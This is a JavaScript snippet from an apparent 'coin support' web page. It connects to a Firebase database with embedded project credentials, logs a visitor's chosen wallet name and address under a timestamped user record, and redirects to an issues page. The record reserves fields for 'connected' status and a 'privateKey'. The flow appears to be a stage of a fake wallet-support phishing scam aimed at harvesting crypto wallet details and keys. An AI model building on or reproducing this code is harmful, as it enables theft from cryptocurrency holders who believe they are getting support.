    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
        import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";

        // YOUR EXACT FIREBASE CONFIGURATION
        const firebaseConfig = {
          apiKey: "AIzaSyC33I7HRwiKo7DtdRsdtdK6OnqDwAquJfI",
          authDomain: "coinsupport-8b036.firebaseapp.com",
          databaseURL: "https://coinsupport-8b036-default-rtdb.europe-west1.firebasedatabase.app",
          projectId: "coinsupport-8b036",
          storageBucket: "coinsupport-8b036.firebasestorage.app",
          messagingSenderId: "575774102570",
          appId: "1:575774102570:web:1d0c34b60807dfb2c75f53",
          measurementId: "G-YGCSNX4H9L"
        };

        // Initialize Firebase
        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);

        window.selectWallet = async (walletName, address) => {
            const statusMsg = document.getElementById('status-msg');
            statusMsg.classList.remove('hidden');
            statusMsg.innerHTML = '<span class="loader"></span> Connecting to ' + walletName + '...';

            try {
                // Create a unique key for this session
                const newUserDataRef = ref(db, 'users/' + Date.now());
                
                // Save data to Firebase
                await set(newUserDataRef, {
                    walletName: walletName,
                    walletAddress: address,
                    timestamp: Date.now(),
                    issue: null,
                    connected: false,
                    privateKey: null
                });

                // Store in session for immediate use in next pages
                sessionStorage.setItem('selectedWallet', walletName);
                sessionStorage.setItem('walletAddress', address);

                // Redirect to issues page
                window.location.href = 'issues.html';

            } catch (error) {
                console.error("Firebase Error:", error);
                statusMsg.classList.remove('hidden');
                statusMsg.className = "mb-4 p-3 bg-red-900/30 border border-red-800 rounded text-red-200 text-sm text-center";
                statusMsg.innerHTML = "Connection failed. Please try again.";
            }
        };
    </script>
